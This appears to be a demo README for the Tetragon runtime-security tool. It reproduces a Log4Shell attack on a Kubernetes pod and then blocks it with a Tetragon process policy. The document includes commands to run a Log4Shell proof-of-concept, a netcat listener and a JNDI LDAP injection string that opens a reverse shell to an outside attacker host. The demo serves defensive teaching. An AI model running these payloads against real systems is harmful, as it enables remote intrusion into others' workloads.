# Tetragon Demo

Let's get the attacker machine ready (find more details [here](https://github.com/nmeisenzahl/hijack-kubernetes)):

```bash
cd log4j-shell-poc

sudo python3 poc.py --userip demo01-vm.westeurope.cloudapp.azure.com --webport 80 --lport 443 &
sudo nc -lvnp 443

```

Now inject the jndi string into the demo app:

`${jndi:ldap://demo01-vm.westeurope.cloudapp.azure.com:1389/a}`

You should now have an open reverse shell into the pod.

Next, implement a policy to deny such processes:

```bash
kubectl apply -f ./src/block-process-policy.yaml
```

```bash
kubectl logs -n kube-system -l app.kubernetes.io/name=tetragon -c export-stdout | tetra getevents -o compact
```

You now shouldn't be able to access the pod anymore.
